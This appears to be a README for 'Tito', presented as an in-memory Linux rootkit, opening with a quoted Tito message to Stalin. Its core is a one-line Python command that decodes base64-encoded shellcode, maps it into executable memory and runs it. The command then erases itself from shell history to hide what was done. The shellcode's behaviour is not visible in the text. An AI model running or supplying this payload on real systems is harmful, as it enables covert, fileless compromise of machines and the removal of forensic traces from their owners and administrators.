# Tito
An In-Memory Rootkit For Linux

# From Tito to Stalin

"Stop sending people to kill me. We’ve already captured five of them, one of them with a bomb and another with a rifle. If you don’t stop sending killers, I’ll send one to Moscow, and I won’t have to send a second."

You can run the entire rootkit from the command-line like so:

python3 -c 'import base64, mmap, ctypes; encoded_shellcode = "SDHJSIHp9////0iNBe////9Iu6ajGtSlB5bkSDFYJ0gt+P///+L07hs1tsxpuZfOo4OE8VjEgs6OeYD7VX75pqMa+81o+4GJ03LnlnW5rfXrX5jpKuDUiJE1vdZv8uTw9E6KzzzO66OjGtSlB5bk"; shellcode = base64.b64decode(encoded_shellcode); mem = mmap.mmap(-1, len(shellcode), mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC); mem.write(shellcode); addr = ctypes.addressof(ctypes.c_char.from_buffer(mem)); shell_func = ctypes.CFUNCTYPE(None)(addr); print("... and I won’t have to send a second."); shell_func()' && history -d $(history | awk 'END { print $1 }')
